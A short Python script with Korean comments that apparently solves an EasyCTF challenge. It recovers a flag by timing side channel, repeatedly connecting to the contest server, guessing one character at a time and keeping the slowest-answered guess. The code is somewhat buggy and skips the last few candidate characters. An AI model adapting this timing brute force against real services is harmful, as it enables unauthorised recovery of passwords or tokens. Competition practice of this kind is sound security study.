from socket import *
import threading
import time
flag = []
i = 0
Max = -1
index = 0
value = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{"+"}14!"
while 1:
	s=socket(AF_INET,SOCK_STREAM)  #서버와 소통할 소켓을 만드는 과정
	s.connect(("c1.easyctf.com",12482))

	recvdata = s.recv(1000)
	print(recvdata)   #서버에서 데이터를 가져온다.(예를 들어 "1번답을 입력하세요: ")
	time.sleep(0.1)  #데이터를 표시해야 하므로 약간의 시간을 주어야함

	start_time = time.time()
	if i==0:
		flag.append(value[i])
	flag[index] = value[i]
	flag_encode = ''.join(flag)+"\n"

	s.send(flag_encode.encode())  #값을 서버로 전송
	print(flag_encode)
	recvdata = s.recv(1000)
	time.sleep(0.1)
	print(recvdata)
	
	end = time.time() - start_time
	print(end)
	if end > Max:
		Max = end
		Max_index = i
	i += 1
	if i == 55:
		i = 0
		Max = -1
		flag[index] = value[Max_index]
		index += 1

s.close()